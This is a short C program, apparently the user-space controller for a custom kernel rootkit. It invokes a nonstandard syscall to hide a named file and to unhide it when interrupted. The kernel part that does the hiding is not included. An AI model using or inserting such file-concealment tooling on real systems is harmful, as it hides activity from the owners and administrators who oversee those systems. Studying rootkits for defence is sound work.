#include <unistd.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <signal.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>

#include "types.h"

#define BUF_LEN (512)

// Wellcome to the funny world of buffer overflows!.
static char file2hide[BUF_LEN];
static int keep_iterating;

void int_handler(int sig) {
	syscallData data;

	data.filename = file2hide;
	syscall(YARR_SYSCALL, STOP_HIDE_FILE, &data);
	keep_iterating = 0;
	return;
}

int main(int argc, char *argv[]) {
	syscallData data;

	if (argc != 2)
		printf("Usage: %s <filename>\n", argv[0]), exit(-1);

	// Naaaah, I was joking :).
	strncpy(file2hide, argv[1], BUF_LEN);
	data.filename = file2hide;
	syscall(YARR_SYSCALL, HIDE_FILE, &data);

	signal(SIGINT, int_handler);
	keep_iterating = 0x01ec0ded;
	while (keep_iterating);

	return 0;
}

